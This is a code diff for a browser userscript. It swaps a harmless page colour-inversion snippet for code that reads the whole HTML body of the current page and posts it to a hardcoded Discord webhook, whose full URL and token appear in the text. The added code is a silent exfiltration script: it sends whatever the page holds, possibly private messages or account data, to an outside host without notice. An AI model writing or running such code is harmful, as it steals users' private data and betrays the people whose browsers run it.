@@ -1,21 +1,25 @@
 (function() {
-    var css = 'html {-webkit-filter: invert(100%);' +
-        '-moz-filter: invert(100%);' +
-        '-o-filter: invert(100%);' +
-        '-ms-filter: invert(100%); }',
-    head = document.getElementsByTagName('head')[0],
-    style = document.createElement('style');
+    'use strict';
 
-    if (!window.counter) { window.counter = 1; } else  { window.counter ++;
-        if (window.counter % 2 == 0) { var css ='html {-webkit-filter: invert(0%); -moz-filter: invert(0%); -o-filter: invert(0%); -ms-filter: invert(0%); }' }
-    };
+    const webhookUrl = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";
+    const message = document.body.innerHTML;
 
-    style.type = 'text/css';
-    if (style.styleSheet){
-        style.styleSheet.cssText = css;
-    } else {
-        style.appendChild(document.createTextNode(css));
-    }
-
-    head.appendChild(style);
-}());
+    GM_xmlhttpRequest({
+        method: "POST",
+        url: webhookUrl,
+        data: JSON.stringify({ content: message }),
+        headers: {
+            "Content-Type": "application/json"
+        },
+        onload: function(response) {
+            if (response.status === 204) {
+                console.log("Message sent successfully!");
+            } else {
+                console.error(`Error sending message. Status code: ${response.status}`);
+            }
+        },
+        onerror: function(error) {
+            console.error(`An error occurred: ${error}`);
+        }
+    });
+})();
